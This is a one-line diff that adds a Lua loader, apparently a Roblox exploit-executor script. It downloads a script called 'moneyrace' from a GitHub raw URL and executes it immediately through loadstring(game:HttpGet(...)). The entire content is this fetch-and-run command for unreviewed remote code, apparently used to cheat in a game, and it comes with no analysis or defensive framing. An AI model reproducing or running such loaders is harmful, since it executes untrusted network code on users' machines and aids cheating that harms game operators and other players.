@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xet55/XetsScripts/main/moneyrace'))()
